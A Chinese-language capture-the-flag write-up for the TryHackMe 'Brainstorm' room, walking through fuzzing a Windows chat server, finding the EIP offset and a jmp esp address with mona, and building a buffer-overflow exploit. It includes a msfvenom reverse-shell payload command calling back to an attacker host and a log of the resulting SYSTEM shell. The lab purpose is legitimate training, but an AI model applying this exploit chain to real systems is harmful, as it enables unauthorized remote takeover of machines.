# Brainstorm

对聊天程序进行逆向工程并编写脚本以利用 Windows 计算机。

---

循例先扫，靶机禁ping，要加-Pn：

    nmap -sS 10.10.190.110 -Pn -p- -T5

端口藏的深，需要 -p-

    21/tcp   open  ftp
    3389/tcp open  ms-wbt-server
    9999/tcp open  abyss

用anonymous登录ftp,有料：

    ftp> passive

    08-29-19  09:26PM                43747 chatserver.exe
    08-29-19  09:27PM                30761 essfunc.dll

    ftp> binary

将这些文件下载。

由于我这里没有配置好的windows环境，就借用https://tryhackme.com/room/bufferoverflowprep这个房间的靶机来完成。

在win机器上运行这个exe，看命令行说是开了个服务，刚刚扫到个9999未知服务，用nmap -sV，nmap卡死了貌似。

用nc连接一下看看

提示：

    Welcome to Brainstorm chat (beta)
    Please enter your username (max 20 characters):

尝试了一下，username限死了20个字符，但是massage好像没限制，所以我们可以尝试对massage进行fuzzing

### 注意：我们需要先输入username后才能输入massage

丢到Immunity Debugger软件上，然后就可以按照我们刚刚学的缓冲区溢出技术进行操作了

    !mona config -set workingfolder c:\mona\%p

然后open这个exe文件，进行fuzzing

### 注意：fuzz脚本的ip和端口是设置到win机器上，而不是我们这个房间的靶机，因为我们希望利用Immunity Debugger

fuzzing测到：

    Fuzzing crashed at 2100 bytes

大概在2100上下

那么接下来就是找栈帧的（EIP）return address的具体位置：

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500

    !mona findmsp -distance 2500

结果：

    EIP contains normal pattern : 0x31704330 (offset 2012)

我们知道的精确的位置：2012，接下来我们就只需填充2012长度的随机数据即可到return address

尝试在2012的位置后填充“BBBB”，成功覆盖EIP

### 寻找坏字符：

自己写个生成\x00-\xff的脚本

    !mona bytearray -b "\x00"

    !mona compare -f C:\mona\chatserver\bytearray.bin -a [esp address]

貌似并没有任何坏字符，除了\x00，这很棒，不用逐个逐个排查了。

### 找jmp esp地址

    !mona jmp -r esp -cpb "\x00"

随便选一个

然后猜一手小端序：

    "\xdf\x14\x50\x62 ------ 625014DF

使用该地址覆盖掉eip(return address)

### 生成shellcode

    msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c

将生成的shellcode添加到eip的后面

### NOP

为了稳定，我们可以在shellcode之前，eip之后添加一点nop

    "\x90" * 16

---

成功getshell

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">nc</font> <font color="#9755B3">-vlnp</font> 8888                                                         130 <font color="#EC0101"><b>⨯</b></font>
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.190.110.
Ncat: Connection from 10.10.190.110:49365.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system</pre>

### 别忘了一件事，记得把exploit脚本的ip地址改回本房间的靶机！
